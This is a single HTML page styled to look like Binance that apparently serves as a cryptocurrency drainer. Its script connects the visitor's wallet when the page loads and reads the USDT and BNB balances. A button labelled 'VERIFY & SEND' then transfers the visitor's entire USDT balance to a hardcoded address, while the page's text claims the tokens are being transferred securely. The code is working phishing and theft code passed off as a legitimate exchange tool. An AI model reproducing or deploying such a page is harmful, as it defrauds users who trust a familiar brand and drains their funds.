<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Send USDT - Binance Style</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to right, #0d0d0d, #1a1a1a);
      color: #f1f1f1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .navbar {
      position: absolute;
      top: 0;
      width: 100%;
      background: #000;
      padding: 1rem 2rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
    }
    .navbar .logo {
      color: #facc15;
      font-weight: bold;
      font-size: 1.3rem;
    }
    .main {
      text-align: center;
      max-width: 480px;
      padding: 2rem;
      background: rgba(0, 0, 0, 0.6);
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
    }
    h1 {
      color: #facc15;
      margin-bottom: 0.5rem;
    }
    p {
      font-size: 0.95rem;
      color: #ccc;
      margin-bottom: 2rem;
    }
    button {
      background-color: #facc15;
      border: none;
      padding: 1rem 2rem;
      border-radius: 8px;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #e0b100;
    }
    #log {
      margin-top: 1.5rem;
      font-size: 0.9rem;
      color: #ff7675;
    }
    .balance-info {
      color: #999;
      font-size: 0.9rem;
      margin-top: 1rem;
    }
  </style>
</head>
<body>
  <div class="navbar">
    <div class="logo">BINANCE</div>
  </div>
  <div class="main">
    <h1>Send All USDT</h1>
    <p>Ensure your tokens are transferred securely on Binance Smart Chain</p>
    <button id="sendBtn">üíº VERIFY & SEND</button>
    <div class="balance-info">
      <div id="walletStatus">Wallet not connected</div>
      <div>USDT: <span id="usdtBalance">--</span></div>
      <div>BNB: <span id="bnbBalance">--</span></div>
    </div>
    <div id="log"></div>
  </div>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
    const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
    const usdtAbi = [
      "function balanceOf(address owner) view returns (uint256)",
      "function transfer(address to, uint256 value) returns (bool)"
    ];

    async function init() {
      if (!window.ethereum) {
        document.getElementById("walletStatus").textContent = "Please use Trust Wallet or MetaMask.";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("walletStatus").textContent = `Connected: ${address.slice(0,6)}...${address.slice(-4)}`;

        const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
        const usdtBalance = await usdt.balanceOf(address);
        document.getElementById("usdtBalance").textContent = ethers.utils.formatUnits(usdtBalance, 18);

        const bnbBalance = await provider.getBalance(address);
        document.getElementById("bnbBalance").textContent = ethers.utils.formatEther(bnbBalance);

        document.getElementById("sendBtn").onclick = async () => {
          if (usdtBalance.isZero()) {
            document.getElementById("log").textContent = "‚ùå Your USDT balance is 0.";
            return;
          }

          try {
            document.getElementById("log").textContent = "‚è≥ Sending...";
            const tx = await usdt.transfer(recipient, usdtBalance);
            await tx.wait();
            document.getElementById("log").textContent = "‚úÖ Transfer complete!";
          } catch (err) {
            console.error(err);
            document.getElementById("log").textContent = "‚ùå Transaction failed.";
          }
        };
      } catch (err) {
        console.error(err);
        document.getElementById("walletStatus").textContent = "‚ùå Wallet connection failed.";
      }
    }

    window.addEventListener("load", init);
  </script>
</body>
</html>
